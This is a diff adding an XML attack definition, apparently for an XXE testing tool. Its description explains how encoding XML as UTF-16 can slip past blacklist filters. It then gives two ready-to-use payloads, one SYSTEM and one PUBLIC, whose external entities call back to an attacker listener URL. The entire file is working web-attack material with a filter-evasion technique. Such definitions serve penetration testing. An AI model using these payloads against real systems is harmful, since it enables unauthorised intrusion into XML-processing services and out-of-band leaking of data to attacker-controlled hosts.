@@ -1,0 +1,29 @@
+<config>
+<name>XXE Attack using UTF-16</name>
+<description>Some simple blacklisting countermeasures can probably bypassed by changing the default XML charset (which is UTF-8), to a different one, for example, UTF-16. To convert it to UTF-16, you can use the linux tool iconv: "cat file.xml | iconv -f UTF-8 -t UTF-16 > file_utf16.xml"</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>true</attackListenerURL>
+    <externalResources>false</externalResources>
+</params>
+<attackvectors>
+<attackvector type="system" default="true">
+<directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url SYSTEM "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+</attackvector>
+<attackvector type="public">
+<directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY url PUBLIC p "§tf_listenURL§">
+]>
+<data>&url;</data>]]></directMessage>
+</attackvector>
+</attackvectors>
+</config>
